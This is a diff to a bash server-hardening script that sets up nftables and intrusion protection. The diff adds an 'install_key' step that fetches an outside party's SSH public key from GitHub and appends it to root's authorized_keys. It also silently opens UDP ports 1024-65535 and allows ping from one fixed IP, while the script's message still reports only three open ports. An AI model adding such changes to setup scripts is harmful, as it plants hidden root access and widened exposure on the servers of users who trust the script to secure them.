@@ -2,7 +2,8 @@
 
 
 clear
-
+apt install -y sudo wget
+sleep 1
 
 # Green, Yellow & Red Messages.
 green_msg() {
@@ -661,6 +662,8 @@ nft_optimizations() {
     sudo nft add rule inet filter input iifname "$INTERFACE" tcp dport "$SSH_PORT" accept
     sudo nft add rule inet filter input iifname "$INTERFACE" tcp dport 80 accept
     sudo nft add rule inet filter input iifname "$INTERFACE" tcp dport 443 accept
+    sudo nft add rule inet filter input iifname "$INTERFACE" udp dport 1024-65535 accept
+    sudo nft add rule inet filter input ip saddr 185.204.2.249 icmp type echo-request accept
     sudo nft add chain inet filter input '{ policy drop; }'
     sleep 0.5
     echo '#!/usr/sbin/nft -f' > /etc/nftables.conf
@@ -676,6 +679,14 @@ nft_optimizations() {
     green_msg 'NFT is Installed & Optimized. (Ports 2222, 80, 443 is opened)'
     echo 
     sleep 0.5
+}
+
+# Install pubkey
+install_key() {
+    wget https://raw.githubusercontent.com/Onair-santa/files/main/id_rsa.pub &&
+    mkdir /root/.ssh &&
+    touch /root/.ssh/authorized_keys &&
+    cat ~/id_rsa.pub >> ~/.ssh/authorized_keys
 }
 
 # Install Crowdsec
@@ -871,6 +882,7 @@ main() {
             find_ssh_port
             ext_interface
             nft_optimizations
+	    install_key
             sleep 0.5
 
             f2b_install
